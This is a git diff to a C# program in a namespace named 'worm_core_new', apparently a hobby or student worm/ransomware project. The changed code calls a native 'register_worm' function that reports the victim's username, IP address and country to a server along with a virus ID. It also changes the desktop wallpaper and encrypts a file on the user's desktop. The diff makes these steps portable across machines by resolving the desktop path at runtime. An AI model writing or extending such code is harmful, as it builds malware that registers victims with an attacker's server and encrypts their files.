@@ -17,7 +17,7 @@ namespace worm_core_new
     class Program
     {
         // Use DllImport to import the Win32 MessageBox function.
-        [DllImport(@"C:\git\_personal\worm-core-new\worm-core-new\worm-core.dll", CharSet = CharSet.Unicode)]
+        [DllImport("worm-core.dll", CallingConvention = CallingConvention.Cdecl)]
         static extern int register_worm(char XOR_key, [MarshalAs(UnmanagedType.LPStr)]string virus_id, [MarshalAs(UnmanagedType.LPStr)]string hostname, [MarshalAs(UnmanagedType.LPStr)]string ip, [MarshalAs(UnmanagedType.LPStr)]string country);
 
         [DllImport("user32.dll", SetLastError = true)]
@@ -57,14 +57,21 @@ namespace worm_core_new
             SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, @"c:\temp\image.png", SPIF_UPDATEINIFILE);
             Console.WriteLine("\nChanged desktop background");
 
-            //Encrypting file on desktop 
-            Encrypt("C:/Users/Matthew/Desktop/matthew.txt", "C:/Users/Matthew/Desktop/matthew-encrypted.txt");
-            Decrypt("C:/Users/Matthew/Desktop/matthew-encrypted.txt", "C:/Users/Matthew/Desktop/matthew-decrypted.txt");
+            //Encrypting file on desktop
+            string fileToEncrypt = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "textfile.txt");
+            string encryptedFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "textfile-encrypted.txt");
+            string decryptedFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "textfile-decrypted.txt");
+
+            if (File.Exists(fileToEncrypt))
+            {
+                Encrypt(fileToEncrypt, encryptedFile);
+                Decrypt(encryptedFile, decryptedFile);
+            }
 
             // Call kade's function or work with kade to send everything to server
             int yes = register_worm('A', "12345", Environment.UserName, ipString, json["countryCode"].ToString());
 
-            if (yes == 0)
+            if (yes == 1)
             {
                 Console.WriteLine("NOOOOOOOOOOOOOOOOOOOOOOOOOO");
             }
